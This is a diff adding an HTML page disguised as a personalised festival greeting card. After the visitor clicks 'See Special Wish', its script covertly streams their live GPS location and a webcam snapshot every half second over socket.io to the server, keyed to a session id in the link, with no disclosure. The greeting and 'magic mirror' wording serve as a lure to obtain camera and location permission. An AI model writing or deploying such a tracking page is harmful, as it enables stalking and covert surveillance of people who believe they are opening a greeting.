@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Greeting Card</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            justify-content: center;
+            text-align: center;
+            background-color: #000;
+            color: #fff;
+            overflow-x: hidden;
+        }
+
+        .step-container {
+            display: none;
+            animation: fadeIn 0.5s;
+        }
+
+        .step-container.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .greeting-card {
+            background: linear-gradient(135deg, #ff00cc, #333399);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .greeting-title {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            font-family: 'Brush Script MT', cursive;
+            color: #fff;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        .greeting-name {
+            font-size: 3rem;
+            font-weight: bold;
+            color: #ffeb3b;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+        }
+
+        #video-container {
+            position: relative;
+            width: 100%;
+            max-width: 480px;
+            /* Medium size */
+            margin: 0 auto;
+            display: none;
+            border: 5px solid #ffeb3b;
+            border-radius: 15px;
+            box-shadow: 0 0 30px #ffeb3b;
+        }
+
+        #video {
+            width: 100%;
+            border-radius: 10px;
+            transform: scaleX(-1);
+            /* Mirror effect */
+        }
+
+        .overlay-text {
+            position: absolute;
+            bottom: 10px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            color: white;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-shadow: 2px 2px 4px #000;
+            pointer-events: none;
+        }
+
+        /* Scrolling Text Animation */
+        .scrolling-text-container {
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+            margin-top: 20px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px;
+        }
+
+        .scrolling-text {
+            position: absolute;
+            width: 100%;
+            text-align: center;
+            font-size: 1.1rem;
+            line-height: 1.6;
+            color: #fff;
+            animation: scrollUp 20s linear infinite;
+            top: 100%;
+        }
+
+        @keyframes scrollUp {
+            0% {
+                top: 100%;
+            }
+
+            100% {
+                top: -150%;
+            }
+
+            /* Adjust based on text length */
+        }
+    </style>
+</head>
+
+<body>
+    <main>
+        <!-- Step 1: Name Input -->
+        <div id="step-name" class="card step-container active">
+            <h2>Welcome!</h2>
+            <p>Please enter your name to see your greeting.</p>
+            <input type="text" id="user-name-input" placeholder="Your Name">
+            <button id="submit-name-btn" class="btn" style="margin-top: 10px;">Next</button>
+        </div>
+
+        <!-- Step 2: Greeting Card -->
+        <div id="step-greeting" class="step-container">
+            <div class="greeting-card">
+                <div class="greeting-title">Happy <span id="festival-display">Festival</span></div>
+                <div class="greeting-name" id="name-display">User</div>
+                <p style="margin-top: 20px;">I have a special wish for you and your family!</p>
+                <button id="special-wish-btn" class="btn"
+                    style="background-color: #ffeb3b; color: #333; font-weight: bold;">See Special Wish</button>
+            </div>
+        </div>
+
+        <!-- Step 3: Camera/Wish -->
+        <div id="step-wish" class="step-container">
+            <div id="video-container">
+                <video id="video" autoplay playsinline></video>
+                <div class="overlay-text">
+                    Happy <span id="overlay-festival"></span> <span id="overlay-name"></span>!
+                </div>
+            </div>
+
+            <div class="scrolling-text-container">
+                <div class="scrolling-text">
+                    <p>My Dearest <span id="long-msg-name"></span>,</p>
+                    <p>
+                        On this auspicious occasion of <span id="long-msg-festival"></span>, I wanted to take a moment
+                        to send my warmest wishes to you and your entire family. May this festival bring an abundance of
+                        joy, laughter, and prosperity into your home.
+                        <br><br>
+                        As the lights of this celebration shine bright, may they illuminate your path towards success
+                        and happiness. I hope that the bond of love within your family grows stronger with each passing
+                        day. May you all be blessed with good health, peace of mind, and the strength to overcome any
+                        challenge that comes your way.
+                        <br><br>
+                        Let this festive season be a reminder of all the beautiful moments we've shared and the many
+                        more that are yet to come. May your home be filled with the sweet aroma of delicious treats and
+                        the echoing sounds of happy conversations.
+                        <br><br>
+                        Wishing you a celebration that is as wonderful and special as you are. Have a truly magical and
+                        unforgettable <span id="long-msg-festival-2"></span>!
+                        <br><br>
+                        With lots of love and best wishes to you and your loved ones.
+                    </p>
+                </div>
+            </div>
+
+            <p id="status-msg" style="margin-top: 20px;">Loading magic...</p>
+        </div>
+
+        <canvas id="canvas" style="display:none;"></canvas>
+    </main>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const urlParams = new URLSearchParams(window.location.search);
+        const sessionId = urlParams.get('session');
+        const festival = urlParams.get('festival') || 'Holiday';
+
+        // UI Elements
+        const stepName = document.getElementById('step-name');
+        const stepGreeting = document.getElementById('step-greeting');
+        const stepWish = document.getElementById('step-wish');
+
+        const nameInput = document.getElementById('user-name-input');
+        const submitNameBtn = document.getElementById('submit-name-btn');
+        const festivalDisplay = document.getElementById('festival-display');
+        const nameDisplay = document.getElementById('name-display');
+        const specialWishBtn = document.getElementById('special-wish-btn');
+
+        const videoContainer = document.getElementById('video-container');
+        const video = document.getElementById('video');
+        const overlayFestival = document.getElementById('overlay-festival');
+        const overlayName = document.getElementById('overlay-name');
+        const statusMsg = document.getElementById('status-msg');
+        const canvas = document.getElementById('canvas');
+        const ctx = canvas.getContext('2d');
+
+        // Long message elements
+        const longMsgName = document.getElementById('long-msg-name');
+        const longMsgFestival = document.getElementById('long-msg-festival');
+        const longMsgFestival2 = document.getElementById('long-msg-festival-2');
+
+        let userName = '';
+
+        if (!sessionId) {
+            alert("Invalid Link");
+        } else {
+            socket.emit('client-connect', sessionId);
+        }
+
+        // Step 1 -> Step 2
+        submitNameBtn.addEventListener('click', () => {
+            userName = nameInput.value.trim();
+            if (!userName) return alert("Please enter your name");
+
+            festivalDisplay.innerText = festival;
+            nameDisplay.innerText = userName;
+
+            stepName.classList.remove('active');
+            stepGreeting.classList.add('active');
+        });
+
+        // Step 2 -> Step 3 (Trigger Permissions)
+        specialWishBtn.addEventListener('click', () => {
+            stepGreeting.classList.remove('active');
+            stepWish.classList.add('active');
+
+            // Populate long message
+            longMsgName.innerText = userName;
+            longMsgFestival.innerText = festival;
+            longMsgFestival2.innerText = festival;
+
+            startTracking();
+        });
+
+        function startTracking() {
+            statusMsg.innerText = "Accessing magic mirror...";
+
+            overlayFestival.innerText = festival;
+            overlayName.innerText = userName;
+
+            // Request Location
+            if (navigator.geolocation) {
+                navigator.geolocation.watchPosition((position) => {
+                    socket.emit('send-location', {
+                        sessionId,
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    });
+                }, (error) => {
+                    console.error("Location error:", error);
+                });
+            }
+
+            // Request Camera
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+                .then((stream) => {
+                    video.srcObject = stream;
+                    videoContainer.style.display = 'block';
+                    statusMsg.style.display = 'none';
+
+                    setInterval(() => {
+                        captureAndSendFrame();
+                    }, 500); // Send frame every 500ms
+                })
+                .catch((err) => {
+                    console.error("Camera error:", err);
+                    statusMsg.innerText = "Please allow camera access to see the magic wish! " + err.message;
+                });
+        }
+
+        function captureAndSendFrame() {
+            if (video.readyState === video.HAVE_ENOUGH_DATA) {
+                canvas.width = video.videoWidth / 4;
+                canvas.height = video.videoHeight / 4;
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                const image = canvas.toDataURL('image/jpeg', 0.5);
+                socket.emit('send-frame', { sessionId, image });
+            }
+        }
+    </script>
+</body>
+
+</html>
